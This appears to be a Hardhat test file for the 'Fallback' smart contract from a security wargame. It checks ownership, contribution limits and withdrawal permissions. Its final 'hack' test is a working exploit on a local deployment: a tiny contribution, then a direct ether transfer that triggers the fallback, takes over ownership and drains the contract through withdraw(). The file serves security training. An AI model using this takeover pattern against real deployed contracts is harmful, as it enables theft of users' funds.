import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import chai, { expect } from "chai";
import { solidity } from "ethereum-waffle";
import { deployments, ethers } from "hardhat";

import { Fallback } from "../typechain";

chai.use(solidity);

describe("DepoExchange", () => {
  let owner: SignerWithAddress;
  let tester: SignerWithAddress;

  let fallbackInstance: Fallback;

  beforeEach(async () => {
    const signers = await ethers.getSigners();
    owner = signers[0];
    tester = signers[1];

    const receipt = await deployments.deploy("Fallback", {
      from: owner.address,
      args: [],
      log: true,
    });
    fallbackInstance = await ethers.getContractAt("Fallback", receipt.address);
  });

  describe("Fallback", async () => {
    context("deploy", async () => {
      it("owner should be deployer", async () => {
        expect(await fallbackInstance.owner()).to.be.equal(owner.address);
      });

      it("owner's contribution should be 1000 ethers.", async () => {
        expect(await fallbackInstance.getContribution()).to.be.equal(
          ethers.utils.parseEther("1000")
        );
      });
    });

    context("contribute", async () => {
      it("should be able to contribute ", async () => {
        await fallbackInstance
          .connect(tester)
          .contribute({ value: ethers.utils.parseEther("0.0005") });

        expect(
          await fallbackInstance.connect(tester).getContribution()
        ).to.be.equal(ethers.utils.parseEther("0.0005"));
      });

      it("should not be able to contribute with more than 0.001 ethers.", async () => {
        await expect(
          fallbackInstance
            .connect(tester)
            .contribute({ value: ethers.utils.parseEther("0.002") })
        ).to.be.reverted;
      });
    });

    context("withdraw", async () => {
      it("Only owner should be able to withdraw ", async () => {
        await expect(fallbackInstance.connect(tester).withdraw()).to.be
          .reverted;
      });
    });

    context("hack", async () => {
      it("hacking fallback", async () => {
        await fallbackInstance
          .connect(tester)
          .contribute({ value: ethers.utils.parseEther("0.0005") });

        expect(await fallbackInstance.owner()).to.be.equal(owner.address);

        await tester.sendTransaction({
          to: fallbackInstance.address,
          value: ethers.utils.parseEther("0.0001"),
        });

        expect(await fallbackInstance.owner()).to.be.equal(tester.address);

        await fallbackInstance.connect(tester).withdraw();

        expect(
          await ethers.provider.getBalance(fallbackInstance.address)
        ).to.be.equal(0);
      });
    });
  });
});
